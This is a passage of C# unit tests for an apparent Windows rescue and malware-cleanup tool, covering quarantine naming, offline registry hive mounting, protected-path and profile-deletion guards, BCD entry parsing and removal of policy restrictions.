            ManEntry lg = QuarMan.Parse("REG\tHKLM\\RS_SOFT\\x\t=>\tC:\\q\\reg_x.reg\tSOFTWARE D:\\Windows", out err);
            True(lg != null && lg.Type == "LEGACY", "old format = legacy (view only)");
            Eq(null, QuarMan.Parse("REG-FAIL\tx\ty", out err), "failure lines ignored");
            // names and places
            Eq("5_evil.exe.quarantine", QuarMan.QuarFileName(5, "C:\\x\\evil.exe"), "quarantine name");
            Eq("6_a_b.quarantine", QuarMan.QuarFileName(6, "a:b"), "':' replaced");
            Eq("7_x.quarantine", QuarMan.QuarFileName(7, "D:\\x. . "), "trailing dots / spaces dropped");
            True(QuarMan.QuarFileName(8, "manifest.txt") != "manifest.txt", "a quarantined manifest.txt cannot become the manifest");
            Eq("D:\\RescueScan_Quarantine\\S|E:\\Tools\\RescueScan_Quarantine\\S", string.Join("|", QuarMan.Candidates("D:", "E:\\Tools", "X:", "X:\\Windows\\TEMP", "S").ToArray()), "target drive first");
            Eq("", string.Join("|", QuarMan.Candidates("X:", "X:\\Tools", "X:", "", "S").ToArray()), "never on the WinPE RAM disk");
            Eq("D:\\RescueScan_Quarantine\\S", string.Join("|", QuarMan.Candidates("D:", "C:\\Users\\a\\AppData\\Local\\Temp\\z", "", "C:\\Users\\a\\AppData\\Local\\Temp\\", "S").ToArray()), "never under %TEMP%");
            Eq("C:\\RescueScan_Quarantine\\S", string.Join("|", QuarMan.Candidates("", "C:\\", "X:", "", "S").ToArray()), "no target yet: next to the exe");
            string d = Path.Combine(Path.GetTempPath(), "rs_q_" + Id); 
            True(QuarMan.Inside(d, "1.reg"), "inside");
            True(!QuarMan.Inside(d, "..\\1.reg") && !QuarMan.Inside(d, "../1.reg"), "outside");
        }

        static void LocateResolve()
        {
            List<string[]> users = new List<string[]> {
                new string[] { "Ivan", "HKLM\\RS_U0", "D:\\Users\\Ivan", "S-1-5-21-1-2-3-1001" },
                new string[] { "Petr", "HKLM\\RS_U1", "D:\\Users\\Petr", "" },
                new string[] { "Gone", "", "D:\\Users\\Gone", "S-1-5-21-1-2-3-1003" } };
            string kind, uid, rel, rr, phys;
            True(MainForm.Locate("HKLM\\RS_SOFT\\Microsoft\\Windows\\CurrentVersion\\Run", "HKLM\\RS_SOFT", "HKLM\\RS_SYS", users, out kind, out uid, out rel, out rr, out phys), "SOFTWARE");
            Eq("SOFTWARE|Microsoft\\Windows\\CurrentVersion\\Run|HKEY_LOCAL_MACHINE\\SOFTWARE|HKLM\\RS_SOFT", kind + "|" + rel + "|" + rr + "|" + phys, "SOFTWARE parts");
            True(MainForm.Locate("hklm\\rs_sys\\ControlSet001\\Services\\evil", "HKLM\\RS_SOFT", "HKLM\\RS_SYS", users, out kind, out uid, out rel, out rr, out phys), "SYSTEM any case");
            Eq("SYSTEM|ControlSet001\\Services\\evil|HKEY_LOCAL_MACHINE\\SYSTEM", kind + "|" + rel + "|" + rr, "SYSTEM parts");
            True(MainForm.Locate("HKLM\\RS_U0\\Software\\x", "HKLM\\RS_SOFT", "HKLM\\RS_SYS", users, out kind, out uid, out rel, out rr, out phys), "user with SID");
            Eq("USER|S-1-5-21-1-2-3-1001|HKEY_USERS\\S-1-5-21-1-2-3-1001|Software\\x", kind + "|" + uid + "|" + rr + "|" + rel, "user parts");
            True(MainForm.Locate("HKLM\\RS_U1\\Software\\x", "HKLM\\RS_SOFT", "HKLM\\RS_SYS", users, out kind, out uid, out rel, out rr, out phys), "user without SID");
            Eq("dir:\\Users\\Petr|HKEY_LOCAL_MACHINE\\RS_U1", uid + "|" + rr, "user without SID: profile folder");
            True(!MainForm.Locate("HKLM\\SOFTWARE\\x", "HKLM\\RS_SOFT", "HKLM\\RS_SYS", users, out kind, out uid, out rel, out rr, out phys), "WinPE's own SOFTWARE is not the target");
            True(!MainForm.Locate("HKLM\\RS_SOFTX\\a", "HKLM\\RS_SOFT", "HKLM\\RS_SYS", users, out kind, out uid, out rel, out rr, out phys), "prefix of another name");
            True(!MainForm.Locate("HKLM\\RS_SOFT\\x", "", "HKLM\\RS_SYS", users, out kind, out uid, out rel, out rr, out phys), "SOFTWARE not mounted");
            // restore in a LATER session: other mount names, or live
            ManEntry e = new ManEntry(); e.RootKind = "USER"; e.UserId = "S-1-5-21-1-2-3-1001";
            List<string[]> live = new List<string[]> { new string[] { "Ivan", "HKU\\S-1-5-21-1-2-3-1001", "C:\\Users\\Ivan", "S-1-5-21-1-2-3-1001" } };
            Eq("HKU\\S-1-5-21-1-2-3-1001", MainForm.Resolve(e, "HKLM\\SOFTWARE", "HKLM\\SYSTEM", live), "user hive found by SID");
            e.UserId = "dir:\\Users\\Petr";
            List<string[]> later = new List<string[]> { new string[] { "Petr", "HKLM\\RS_U0", "E:\\Users\\Petr", "" } };
            Eq("HKLM\\RS_U0", MainForm.Resolve(e, "HKLM\\RS_SOFT", "HKLM\\RS_SYS", later), "by profile folder, other letter and mount name");
            e.UserId = "S-1-5-21-1-2-3-1003";
            Eq("", MainForm.Resolve(e, "HKLM\\RS_SOFT", "HKLM\\RS_SYS", users), "profile not mounted: refused");
            e.RootKind = "SYSTEM";
            Eq("HKLM\\SYSTEM", MainForm.Resolve(e, "HKLM\\SOFTWARE", "HKLM\\SYSTEM", live), "SYSTEM live");
            Eq("", MainForm.Resolve(e, "HKLM\\RS_SOFT", "", users), "SYSTEM not mounted");
            List<string[]> none = new List<string[]>();
            True(MainForm.Locate("HKU\\S-1-5-21-9-9-9-1005\\Software\\x", "HKLM\\SOFTWARE", "HKLM\\SYSTEM", none, out kind, out uid, out rel, out rr, out phys), "live: any loaded user hive");
            Eq("S-1-5-21-9-9-9-1005|Software\\x|HKEY_USERS\\S-1-5-21-9-9-9-1005", uid + "|" + rel + "|" + rr, "live user parts");
            True(!MainForm.Locate("HKU\\S-1-5-21-9-9-9-1005_Classes\\x", "HKLM\\SOFTWARE", "HKLM\\SYSTEM", none, out kind, out uid, out rel, out rr, out phys), "_Classes hive is not a user hive");
            True(!MainForm.Locate("HKU\\S-1-5-21-9-9-9-1005\\x", "HKLM\\RS_SOFT", "HKLM\\RS_SYS", none, out kind, out uid, out rel, out rr, out phys), "offline: a live HKU hive is not the target");
            True(!MainForm.Locate("HKCU\\Software\\x", "HKLM\\SOFTWARE", "HKLM\\SYSTEM", none, out kind, out uid, out rel, out rr, out phys), "HKCU spelling is not mapped");
            e.RootKind = "USER"; e.UserId = "S-1-5-21-9-9-9-1005";
            Eq("HKU\\S-1-5-21-9-9-9-1005", MainForm.Resolve(e, "HKLM\\SOFTWARE", "HKLM\\SYSTEM", none), "live restore into the loaded hive");
            Eq("", MainForm.Resolve(e, "HKLM\\RS_SOFT", "HKLM\\RS_SYS", none), "offline: not mounted");
            Eq("1A2B3C4D\\WINDOWS", MainForm.InstallId("D:\\Windows", "1A2B3C4D"), "install id: serial + folder, not the letter");
            Eq(MainForm.InstallId("D:\\Windows", "1A2B3C4D"), MainForm.InstallId("C:\\WINDOWS", "1A2B3C4D"), "same installation seen as D: in WinPE and C: live");
            Eq("D:\\WINDOWS", MainForm.InstallId("D:\\Windows", ""), "no serial: path");
        }

        static void ProtectedPaths()
        {
            foreach (string p in new string[] { "C:\\", "D:", "D:\\Windows", "E:\\windows\\system32", "C:\\Program Files", "C:\\Program Files (x86)\\",
                "C:\\ProgramData", "C:\\Users", "C:\\System Volume Information", "\\\\?\\C:\\Windows", "F:\\WINNT", "F:\\WINNT\\System32\\drivers", "\\\\srv\\share" })
                True(MainForm.ProtectedPath(p, "F:\\WINNT").Length > 0, "protected: " + p);
            foreach (string p in new string[] { "C:\\Users\\Ivan\\AppData\\evil", "C:\\ProgramData\\evil", "D:\\Windows\\System32\\drivers\\evil.sys", "C:\\x.", "C:\\Program Files\\Evil" })
                Eq("", MainForm.ProtectedPath(p, "F:\\WINNT"), "deletable: " + p);
        }

        static void ProfilePaths()
        {
            List<string> others = new List<string> { "C:\\Users\\Petr" };
            string why;
            Eq("C:\\Users\\Ivan", MainForm.ProfileDeletePath("C:\\Users\\Ivan", "%SystemDrive%\\Users", "C:\\Windows", "C:\\Users\\Admin", others, out why), "normal profile");
            Eq("C:\\Users\\Ivan", MainForm.ProfileDeletePath("%SystemDrive%\\Users\\Ivan", "", "C:\\Windows", "", others, out why), "env var + default ProfilesDirectory");
            foreach (string bad in new string[] { "C:\\", "C:\\Users", "C:\\Windows", "C:\\Windows\\System32", "C:\\Program Files", "C:\\Users\\Ivan\\..\\..\\Windows",
                "C:\\Users\\Public", "C:\\Users\\Default", "C:\\Users\\Admin", "C:\\Users\\Petr", "%USERPROFILE%", "%SystemDrive%\\Users\\%USERNAME%", "\\\\srv\\x\\Ivan", "Users\\Ivan", "D:\\Users\\Ivan", "C:\\Users\\Ivan\\Docs" })
            {
                Eq("", MainForm.ProfileDeletePath(bad, "%SystemDrive%\\Users", "C:\\Windows", "C:\\Users\\Admin", others, out why), "refused: " + bad);
                True(why.Length > 0, "reason for " + bad);
            }
            Eq("", MainForm.ProfileDeletePath("C:\\Program Files", "C:\\", "C:\\Windows", "", others, out why), "ProfilesDirectory = drive root (malware)");
            Eq("", MainForm.ProfileDeletePath("C:\\Windows\\System32", "C:\\Windows", "C:\\Windows", "", others, out why), "ProfilesDirectory = Windows (malware)");
        }

        static void BcdParse()
        {
            string txt = "Windows Boot Manager\r\n--------------------\r\nidentifier              {bootmgr}\r\ndevice                  partition=\\Device\\HarddiskVolume1\r\npath                    \\EFI\\Microsoft\\Boot\\bootmgfw.efi\r\ndescription             Windows Boot Manager\r\n\r\n" +
                "Windows Boot Loader\r\n-------------------\r\nidentifier              {current}\r\npath                    \\Windows\\system32\\winload.efi\r\ndescription             Windows 10\r\n\r\n" +
                "Firmware Application (101fffff)\r\n-------------------------------\r\nidentifier              {abc}\r\npath                    \\EFI\\evil\\x.efi\r\ndescription             Evil\r\n\r\n" +
                "Resume from Hibernate\r\nidentifier {r}\r\ndescription Resume\r\n";
            List<string[]> e = MainForm.BcdEntries(txt);
            Eq(3, e.Count, "entries with a path");
            Eq("Windows Boot Manager|\\EFI\\Microsoft\\Boot\\bootmgfw.efi", e[0][0] + "|" + e[0][1], "description after path belongs to the same entry (R061)");
            Eq("Windows 10", e[1][0], "second entry");
            Eq("Evil", e[2][0], "third entry");
            True(MainForm.BcdPathOk(e[1][1]) && !MainForm.BcdPathOk(e[2][1]), "path check");
            Eq(0, MainForm.BcdEntries(null).Count, "null");
        }

        static void FsOpsCases()
        {
            string d = Path.Combine(Path.GetTempPath(), "rs_fs_" + Id);
            tempDirs.Add(d);
            string sep = Path.DirectorySeparatorChar.ToString();
            Directory.CreateDirectory(d + sep + "a" + sep + "b");
            string ro = d + sep + "a" + sep + "ro.txt";
            File.WriteAllText(ro, "x");
            File.SetAttributes(ro, FileAttributes.ReadOnly);
            string err;
            True(FsOps.DeleteFile(ro, out err), "read-only file deleted (attrib +r): " + err);
            True(!File.Exists(ro), "gone");
            File.WriteAllText(d + sep + "a" + sep + "b" + sep + "f", "x");
            string m1 = d + sep + "m1", m2 = d + sep + "m2";
            File.WriteAllText(m1, "y");
            True(FsOps.MoveFile(m1, m2, out err) && !File.Exists(m1) && File.Exists(m2), "move");
            File.WriteAllText(m1, "z");
            True(!FsOps.MoveFile(m1, m2, out err), "move never overwrites");
            int failed = 0; err = "";
            True(FsOps.DeleteTree(d + sep + "a", ref failed, ref err), "tree: " + err);
            True(!Directory.Exists(d + sep + "a"), "tree gone");
            True(FsOps.List(d).Contains("m2"), "List");
            Eq(-1, FsOps.Attrs(d + sep + "nothing"), "missing");
        }

        static void RestrictionList()
        {
            List<string[]> u = MainForm.RestrictionItems("HKLM\\RS_U0", false);
            True(u.Exists(delegate(string[] x) { return x[0] == "HKLM\\RS_U0\\Software\\Policies\\Microsoft\\Windows\\System" && x[1] == "DisableCMD"; }), "DisableCMD in its real key (R108/Q6)");
            True(u.Exists(delegate(string[] x) { return x[0] == "HKLM\\RS_U0\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun" && x[1] == null; }), "DisallowRun list subkey");
            foreach (string v in new string[] { "NoWinKeys", "NoLogoff", "DisableLockWorkstation", "NoDrives", "NoViewOnDrive", "NoTrayContextMenu", "DisallowRun" })
                True(u.Exists(delegate(string[] x) { return x[1] == v; }), v);
            True(!u.Exists(delegate(string[] x) { return x[1] == "EnableLUA" || x[1] == "ConsentPromptBehaviorAdmin"; }), "UAC values never touched");
            List<string[]> m = MainForm.RestrictionItems("HKLM\\RS_SOFT", true);
            True(m.Exists(delegate(string[] x) { return x[0] == "HKLM\\RS_SOFT\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" && x[1] == "DisableTaskMgr"; }), "machine path");
            True(m.Exists(delegate(string[] x) { return x[0] == "HKLM\\RS_SOFT\\Policies\\Microsoft\\Windows\\System"; }), "machine DisableCMD");
        }

        // Native path: a REG_SZ without terminator, one with an embedded NUL and a REG_RESOURCE_LIST come back byte for byte
        // through Snapshot -> .reg text -> Parse -> SetRaw.
        static void RawRoundTripWin()
        {
            WindowsOnly();
            string k = Root + "\\rawwin\\src", d = Root + "\\rawwin\\dst";
            byte[][] data = { Encoding.Unicode.GetBytes("abc"), Encoding.Unicode.GetBytes("a\0b\0"), new byte[] { 1, 2, 3 } };
            int[] types = { 1, 1, 8 };
            for (int i = 0; i < 3; i++) True(Reg.SetRaw(k, "v" + i, types[i], data[i]), "SetRaw v" + i);
            string err;
            List<RegSection> snap = Reg.Snapshot(k, null, out err);
            True(snap != null, "snapshot: " + err);
            List<RegSection> back = RegFile.Parse(RegFile.Format(snap, out err), out err);
            True(back != null, "parse: " + err);
            foreach (RegVal v in back[0].Values) True(Reg.SetRaw(d, v.Name, v.Type, v.Data), "restore " + v.Name);
            List<RegSection> again = Reg.Snapshot(d, null, out err);
            for (int i = 0; i < 3; i++)
            {
                RegVal v = again[0].Values.Find(delegate(RegVal x) { return x.Name == "v" + i; });
                True(v != null, "v" + i);
                Eq(types[i], v.Type, "type v" + i);
                Eq(Reg.Hex(data[i]), Reg.Hex(v.Data), "bytes v" + i);
            }
        }

        static string JoinT(List<WinTarget> l)
        {
            List<string> s = new List<string>();
            foreach (WinTarget t in l) s.Add(t.ToString());
            return string.Join(" | ", s.ToArray());
        }

        // A 32-bit build on 64-bit Windows: <running windir>\System32 goes through Sysnative; nothing else changes.
        static void FsPaths()
        {
            Eq("C:\\Windows\\Sysnative\\config\\SYSTEM", MainForm.FsPath("C:\\Windows\\System32\\config\\SYSTEM", "C:\\Windows", true), "WOW64: System32 -> Sysnative");
            Eq("C:\\WINDOWS\\Sysnative\\Tasks", MainForm.FsPath("c:\\windows\\system32\\Tasks", "C:\\WINDOWS", true), "case-insensitive");
            Eq("C:\\Windows\\Sysnative", MainForm.FsPath("C:\\Windows\\System32", "C:\\Windows", true), "the folder itself");
            Eq("C:\\Windows\\System32x\\a", MainForm.FsPath("C:\\Windows\\System32x\\a", "C:\\Windows", true), "only the System32 folder");
            Eq("D:\\Windows\\System32\\drivers", MainForm.FsPath("D:\\Windows\\System32\\drivers", "C:\\Windows", true), "another installation: never redirected");
            Eq("C:\\Windows\\System32\\drivers", MainForm.FsPath("C:\\Windows\\System32\\drivers", "C:\\Windows", false), "64-bit process: unchanged");
            Eq("C:\\Windows\\System32\\Tasks", MainForm.FsPath("C:\\Windows\\System32\\Tasks"), "this (64-bit or non-WOW64) test process: unchanged");
        }

        static void LiveHelpers()
        {
            True(MainForm.SamePath("C:\\Windows", "c:\\WINDOWS\\"), "case and trailing backslash ignored");
            True(!MainForm.SamePath("C:\\Windows", "D:\\Windows"), "other drive");
            True(!MainForm.SamePath("C:\\Windows", ""), "empty never equal");
            True(!MainForm.SamePath(null, null), "null never equal");
            string live = new WinTarget("C:\\Windows", true).ToString(), off = new WinTarget("D:\\Windows", false).ToString();
            True(live.StartsWith("C:\\Windows") && live.Contains("живая"), "live label: " + live);
            True(off.StartsWith("D:\\Windows") && off.Contains("офлайн"), "offline label: " + off);
            if (OnWindows)
            {
                string w = MainForm.RunningWinDir();
                True(w.Length > 3 && Directory.Exists(w + "\\System32"), "RunningWinDir: " + w);
            }
        }

        // The task / Startup / drivers walk never throws, does not follow junctions or symlinks (loops) and still finds
        // every file below.
        static void FilesWalk()
        {
            string d = Path.Combine(Path.GetTempPath(), "rs_walk_" + Id);
            tempDirs.Add(d);
            Directory.CreateDirectory(Path.Combine(d, "a" + Path.DirectorySeparatorChar + "b"));
            File.WriteAllText(Path.Combine(d, "t0"), "x");
            File.WriteAllText(Path.Combine(d, "a" + Path.DirectorySeparatorChar + "t1"), "x");
            File.WriteAllText(Path.Combine(d, "a" + Path.DirectorySeparatorChar + "b" + Path.DirectorySeparatorChar + "t2"), "x");
            if (!OnWindows)   // a symlink loop a/b/loop -> a (Windows: creating one needs a privilege)
            {
                string o;
                Eq(0, Reg.RunProcess("/bin/ln", "-s " + Path.Combine(d, "a") + " " + Path.Combine(d, "a/b/loop"), 10000, out o), "test setup: symlink loop");
            }
            List<string> files = new List<string>(), denied = new List<string>();
            MainForm.FilesBelow(d, 0, files, denied);
            Eq(3, files.Count, "every file once, the loop not followed: " + string.Join(" | ", files.ToArray()));
            Eq(0, denied.Count, "nothing denied");
            files.Clear();
            MainForm.FilesBelow(d, 32, files, denied);
            Eq(1, files.Count, "depth 32 = this folder only");
            files.Clear();
            MainForm.FilesBelow(Path.Combine(d, "missing"), 0, files, denied);
            Eq(0, files.Count + denied.Count, "missing folder: nothing, no exception");
        }

        // ------------------------------------------------------------------ hive mount bookkeeping (simulated reg.exe)
        // A fake HKLM with mount points, hive files, mounts that refuse to unload (regedit has them open) and hive
        // files that cannot be loaded (in use); reg.exe "load"/"unload" are parsed with the reference argv parser.
        class FakeReg
        {
            public readonly HashSet<string> Keys = new HashSet<string>(StringComparer.OrdinalIgnoreCase);    // "HKLM\RS_SOFT"
            public readonly HashSet<string> Files = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            public readonly HashSet<string> Pinned = new HashSet<string>(StringComparer.OrdinalIgnoreCase);  // unload fails
            public readonly HashSet<string> InUse = new HashSet<string>(StringComparer.OrdinalIgnoreCase);   // load fails
            public readonly Dictionary<string, string> Loaded = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            public readonly List<string> Calls = new List<string>();
            public bool Other;     // another instance holds the mount role
            public bool Blocked;   // HKCU DisableRegistryTools: reg.exe refuses everything (RunCode appends the hint)

            public int Run(string args, out string outp)
            {
                Calls.Add(args);
                if (Blocked) { outp = "ERROR: Registry editing has been disabled by your administrator.\r\n" + Reg.RegToolsHint; return 1; }
                List<string> a = ParseArgs(args);
                if (a.Count == 3 && a[0] == "load")
                {
                    if (Keys.Contains(a[1])) { outp = "ERROR: name in use"; return 1; }
                    if (InUse.Contains(a[2])) { outp = "ERROR: The process cannot access the file because it is being used by another process."; return 1; }
                    Keys.Add(a[1]); Loaded[a[1]] = a[2]; outp = "The operation completed successfully."; return 0;
                }
                if (a.Count == 2 && a[0] == "unload")
                {
                    if (!Keys.Contains(a[1])) { outp = "ERROR: The system was unable to find the specified registry key or value."; return 1; }
                    if (Pinned.Contains(a[1])) { outp = "ERROR: Access is denied."; return 1; }
                    Keys.Remove(a[1]); Loaded.Remove(a[1]); outp = "The operation completed successfully."; return 0;
                }
                outp = "ERROR: Invalid syntax."; return 1;
            }

            public string[] HklmNames()
            {
                List<string> n = new List<string> { "HARDWARE", "SAM", "SECURITY", "SOFTWARE", "SYSTEM" };
                foreach (string k in Keys) n.Add(k.Substring(5));
                return n.ToArray();
            }

            public HiveMounts Make()
            {
                return new HiveMounts(Run, delegate(string k) { return Keys.Contains(k); }, delegate(string f) { return Files.Contains(f); },
                                      HklmNames, delegate { return Other; });
            }

            public int Count(string verb) { int n = 0; foreach (string c in Calls) if (c.StartsWith(verb + " ")) n++; return n; }
        }

        static void MountNames()
        {
            foreach (string n in new string[] { "RS_SOFT", "rs_soft", "RS_SYS", "RS_U0", "RS_U17", "rs_u999" })
                True(HiveMounts.IsOurName(n), "ours: " + n);
            foreach (string n in new string[] { "", null, "SOFTWARE", "RS_SOFTX", "RS_U", "RS_Ux", "RS_U1a", "RS_OTHER", "XRS_SOFT" })
                True(!HiveMounts.IsOurName(n), "not ours: " + Show(n));
        }

        static void MountBasic()
        {
            FakeReg r = new FakeReg();
            string soft = "D:\\Windows\\System32\\config\\SOFTWARE", sys = "D:\\Windows\\System32\\config\\SYSTEM";
            r.Files.Add(soft);
            HiveMounts m = r.Make();
            StringBuilder w = new StringBuilder();
            Eq(0, m.Mount("RS_SOFT", soft, w), "mounted");
            Eq("load \"HKLM\\RS_SOFT\" \"D:\\Windows\\System32\\config\\SOFTWARE\"", r.Calls[0], "reg.exe arguments");
            Eq(soft, r.Loaded["HKLM\\RS_SOFT"], "the right file");
            Eq(1, m.Mount("RS_SYS", sys, w), "missing hive file -> failed (reg load would create an empty hive)");
            Eq(1, r.Calls.Count, "...without running reg.exe");
            True(w.ToString().Contains("нет файла " + sys), "reported: " + w);
            r.Files.Add(sys); r.InUse.Add(sys);
            Eq(1, m.Mount("RS_SYS", sys, w), "file in use -> failed");
            True(w.ToString().Contains("being used by another process"), "reg.exe's reason in the warning: " + w);
            True(!r.Keys.Contains("HKLM\\RS_SYS"), "nothing pretended");
            Eq(1, m.Mounted.Count, "only RS_SOFT is ours");
            Eq("", m.UnloadAll(), "unload all");
            Eq(0, r.Keys.Count, "nothing left mounted");
            Eq(0, m.Mounted.Count, "bookkeeping cleared");
        }

        // A crashed run left RS_SOFT and RS_U0..RS_U5; one of them is held open (regedit). All are cleaned up at the start,
        // not only the names reused now; the one that stays is reported, never reused and retried on exit.
        static void MountStale()
        {
            FakeReg r = new FakeReg();
            foreach (string k in new string[] { "HKLM\\RS_SOFT", "HKLM\\RS_U0", "HKLM\\RS_U1", "HKLM\\RS_U2", "HKLM\\RS_U3", "HKLM\\RS_U4", "HKLM\\RS_U5", "HKLM\\RS_OTHER" })
                r.Keys.Add(k);
            r.Pinned.Add("HKLM\\RS_U3");
            HiveMounts m = r.Make();
            StringBuilder w = new StringBuilder();
            m.CleanupStale(w);
            Eq(7, r.Count("unload"), "every stale RS_* unloaded once (RS_OTHER is not ours)");
            True(r.Keys.Contains("HKLM\\RS_OTHER") && r.Keys.Contains("HKLM\\RS_U3") && r.Keys.Count == 2, "left: RS_OTHER, RS_U3 (pinned)");
            True(w.ToString().Contains("HKLM\\RS_U3 остался от прошлого запуска и не выгружается (ERROR: Access is denied.)"), "reported by name with the reason: " + w);
            Eq("RS_U3", string.Join(",", m.Mounted.ToArray()), "kept for a retry on exit");
            string[] users = { "D:\\Users\\a\\NTUSER.DAT", "D:\\Users\\b\\NTUSER.DAT", "D:\\Users\\c\\NTUSER.DAT", "D:\\Users\\d\\NTUSER.DAT" };
            foreach (string u in users) r.Files.Add(u);
            int next = 0, failed = 0;
            List<string> roots = new List<string>();
            foreach (string u in users) roots.Add(m.MountUser(u, w, ref next, ref failed));
            Eq("HKLM\\RS_U0,HKLM\\RS_U1,HKLM\\RS_U2,HKLM\\RS_U4", string.Join(",", roots.ToArray()), "RS_U3 (held) skipped");
            Eq(0, failed, "no failures");
            Eq("D:\\Users\\d\\NTUSER.DAT", r.Loaded["HKLM\\RS_U4"], "the 4th profile is at RS_U4");
            string left = m.UnloadAll();
            True(left.StartsWith("не выгружено: HKLM\\RS_U3") && left.Contains("Access is denied"), "what stays mounted is reported: " + left);
            Eq("RS_U3", string.Join(",", m.Mounted.ToArray()), "still retried later");
            r.Pinned.Clear();
            Eq("", m.UnloadAll(), "retry succeeds once regedit is closed");
            Eq("HKLM\\RS_OTHER", string.Join(",", new List<string>(r.Keys).ToArray()), "a foreign key is never touched");
        }

        // An old mount at the very name we need: unloaded and replaced; if it cannot be unloaded the new mount fails.
        static void MountSameName()
        {
            FakeReg r = new FakeReg();
            string soft = "E:\\Windows\\System32\\config\\SOFTWARE", sys = "E:\\Windows\\System32\\config\\SYSTEM";
            r.Files.Add(soft); r.Files.Add(sys);
            r.Keys.Add("HKLM\\RS_SOFT"); r.Loaded["HKLM\\RS_SOFT"] = "D:\\Windows\\System32\\config\\SOFTWARE";
            r.Keys.Add("HKLM\\RS_SYS"); r.Pinned.Add("HKLM\\RS_SYS");
            HiveMounts m = r.Make();
            StringBuilder w = new StringBuilder();
            Eq(0, m.Mount("RS_SOFT", soft, w), "stale mount replaced");
            Eq(soft, r.Loaded["HKLM\\RS_SOFT"], "now the selected installation's hive");
            True(w.ToString().Contains("выгружен старый HKLM\\RS_SOFT"), "reported: " + w);
            Eq(2, m.Mount("RS_SYS", sys, w), "held name -> 2, not pretended");
            True(w.ToString().Contains("HKLM\\RS_SYS занят старым монтированием") && w.ToString().Contains("Access is denied"), "reported: " + w);
            Eq(0, r.Count("load \"HKLM\\RS_SYS\""), "no load attempted over it");
            True(m.Mounted.Contains("RS_SYS"), "retried on exit");
        }

        // While another instance holds the mount role nothing is mounted or unloaded: its hives stay its own.
        static void MountOtherInstance()
        {
            FakeReg r = new FakeReg();
            r.Other = true;
            string soft = "D:\\Windows\\System32\\config\\SOFTWARE", nt = "D:\\Users\\a\\NTUSER.DAT";
            r.Files.Add(soft); r.Files.Add(nt);
            r.Keys.Add("HKLM\\RS_SOFT"); r.Keys.Add("HKLM\\RS_U0");
            HiveMounts m = r.Make();
            StringBuilder w = new StringBuilder();
            m.CleanupStale(w);
            Eq(2, m.Mount("RS_SOFT", soft, w), "refused");
            Eq(2, m.Mount("RS_SYS", soft, w), "refused");
            int next = 0, failed = 0;
            Eq("", m.MountUser(nt, w, ref next, ref failed), "user hive refused");
            Eq(1, failed, "counted as not mounted");
            Eq(0, r.Calls.Count, "reg.exe never ran");
            Eq(2, r.Keys.Count, "the other instance's mounts untouched");
            string msg = w.ToString();
            Eq(msg.IndexOf(HiveMounts.OtherInstanceMsg), msg.LastIndexOf(HiveMounts.OtherInstanceMsg), "explained once");
            True(msg.Contains(HiveMounts.OtherInstanceMsg), "explained: " + msg);
            Eq("", m.UnloadAll(), "nothing of ours to unload");
            Eq(2, r.Keys.Count, "...and nothing unloaded");
        }

        // reg.exe blocked by DisableRegistryTools: every failure says why, the hint appears once, nothing is pretended.
        static void MountBlocked()
        {
            FakeReg r = new FakeReg();
            string a = "D:\\Users\\a\\NTUSER.DAT", b = "D:\\Users\\b\\NTUSER.DAT", c = "D:\\Users\\c\\NTUSER.DAT";
            r.Files.Add(a); r.Files.Add(b); r.Files.Add(c);
            HiveMounts m = r.Make();
            StringBuilder w = new StringBuilder();
            int next = 0, failed = 0;
            Eq("HKLM\\RS_U0", m.MountUser(a, w, ref next, ref failed), "mounted before the policy was set");
            r.Blocked = true;
            Eq("", m.MountUser(b, w, ref next, ref failed), "blocked");
            Eq("", m.MountUser(c, w, ref next, ref failed), "blocked");
            Eq(2, failed, "both counted");
            string msg = w.ToString();
            True(msg.Contains("не смонтирован " + b + " (ERROR: Registry editing has been disabled by your administrator.)"), "reason: " + msg);
            True(msg.Contains("не смонтирован " + c + " (та же причина)"), "same reason not repeated: " + msg);
            Eq(msg.IndexOf(Reg.RegToolsHint), msg.LastIndexOf(Reg.RegToolsHint), "hint once");
            True(msg.Contains(Reg.RegToolsHint), "hint shown");
            string left = m.UnloadAll();
            True(left.StartsWith("не выгружено: HKLM\\RS_U0 (ERROR: Registry editing has been disabled") && left.EndsWith(Reg.RegToolsHint), "unload: reason + hint: " + left);
            Eq("RS_U0", string.Join(",", m.Mounted.ToArray()), "kept for a retry");
        }

        // Every user mount name used up: the rest is counted as not mounted (was: silently left unscanned after 100).
        static void MountUserCap()
        {
            FakeReg r = new FakeReg();
            for (int i = 0; i < HiveMounts.MaxUserMounts; i++) r.Keys.Add("HKLM\\RS_U" + i);   // every name held
            HiveMounts m = r.Make();
            r.Files.Add("D:\\Users\\z\\NTUSER.DAT");
            StringBuilder w = new StringBuilder();
            int next = 0, failed = 0;
            Eq("", m.MountUser("D:\\Users\\z\\NTUSER.DAT", w, ref next, ref failed), "no free name");
            Eq(1, failed, "counted");
            Eq(0, r.Calls.Count, "held names are skipped, not unloaded");
        }

        // ------------------------------------------------------------------ processes
        static List<string> tempFiles = new List<string>();
        static List<string> tempDirs = new List<string>();

        // Deletes a temp tree without following symlinks / junctions (they are removed as links).
        static void DeleteDir(string d)
        {
            foreach (string sd in Directory.GetDirectories(d))
            {
                if ((File.GetAttributes(sd) & FileAttributes.ReparsePoint) != 0) { try { Directory.Delete(sd); } catch { File.Delete(sd); } continue; }
                DeleteDir(sd);
            }
            foreach (string f in Directory.GetFiles(d)) File.Delete(f);
            Directory.Delete(d);
        }

        static string TempScript(string unixBody, string winBody)
        {
            string f = Path.Combine(Path.GetTempPath(), "rs_test_" + Id + "_" + tempFiles.Count + (OnWindows ? ".cmd" : ".sh"));
            File.WriteAllText(f, OnWindows ? winBody : unixBody);
            tempFiles.Add(f);
            return f;
        }

        static int RunScript(string f, int timeoutMs, out string outp)
        {
            if (OnWindows) return Reg.RunProcess(Reg.SysExe("cmd"), "/c " + Reg.QuoteArg(f), timeoutMs, out outp);
            return Reg.RunProcess("/bin/sh", Reg.QuoteArg(f), timeoutMs, out outp);
        }

        static void ProcBigStderr()
        {
            string line = new string('x', 60);
            string f = TempScript("i=0\nwhile [ $i -lt 4000 ]; do echo " + line + " 1>&2; i=$((i+1)); done\necho done\n",
                                  "@echo off\r\nfor /l %%i in (1,1,4000) do echo " + line + " 1>&2\r\necho done\r\n");
            Stopwatch w = Stopwatch.StartNew();
            string o;
            int rc = RunScript(f, 60000, out o);   // ~250 KB on stderr: reading stdout to the end first would deadlock
            Eq(0, rc, "exit code");
            Eq("done", o.Trim(), "stdout only on success");
